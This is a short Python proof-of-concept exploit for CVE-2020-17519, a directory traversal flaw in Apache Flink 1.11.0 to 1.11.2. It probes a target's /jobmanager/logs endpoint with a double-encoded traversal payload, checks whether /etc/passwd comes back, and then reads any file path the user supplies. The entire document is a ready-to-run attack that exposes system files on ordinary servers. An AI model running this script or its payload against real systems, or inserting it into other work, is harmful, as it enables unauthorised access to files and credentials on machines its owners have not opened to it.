#! /usr/bin/python3
# CVE-2020-17519
# Apache Flink Directory Traversal
# version : 1.11.0 ~ 1.11.2
# version(reg) : ^1\.11\.(0|1|2)$

import subprocess
import argparse 
import requests

print('''==================================\n          CVE-2020-17519\n Apache Flink Directory Traversal\n==================================''')


parser = argparse.ArgumentParser(description="hint: CVE-2020-17519.py -u http://localhost:8081 -f /etc/passwd")
parser.add_argument("-u","--URL", required=True, help='Target server IP (e.g., http://localhost:8081/)')
parser.add_argument("-f","--FILE", required=False, help="File path to access (e.g., /etc/passwd)") 
args = parser.parse_args()

#Detected Vulnerability
def Detected_Vulnerability(URL): 

    payload = f'/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'

    try:
        response = requests.get(URL+payload)
        if "root" in response.text:
            print(f"[*] Detected Vulnerability : True")
            print("----------------------------------")
            return True
        else:
            print(f"[-] Detected Vulnerability : False")
            return False
    except requests.RequestException as e:
        print(f"[-] Detected Vulnerability : False")
        return False


def exploit(URL, FILE):
    file=FILE.replace("/",f"%252f")
    payload=f"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f.."+file
    
    try:
        response = requests.get(URL+payload)
        
        if response.status_code == 200:
            print(f"\n[+] Successful Directory Traversal : {FILE} \n")
            print(response.text)
            return True
        else:
            print(f"\n[-] Directory not found : {FILE}\n")
            return False

    except requests.RequestException as e:
        return False


if __name__ == "__main__":
    URL=args.URL.rstrip("/")
    print(f"[+] Target URL: {URL}")

    if Detected_Vulnerability(URL):
 
        if args.FILE:
            exploit(args.URL, args.FILE)
        else:
            print(f"To perform Directory Traversal, add the -f option (e.g., /etc/passwd) \n")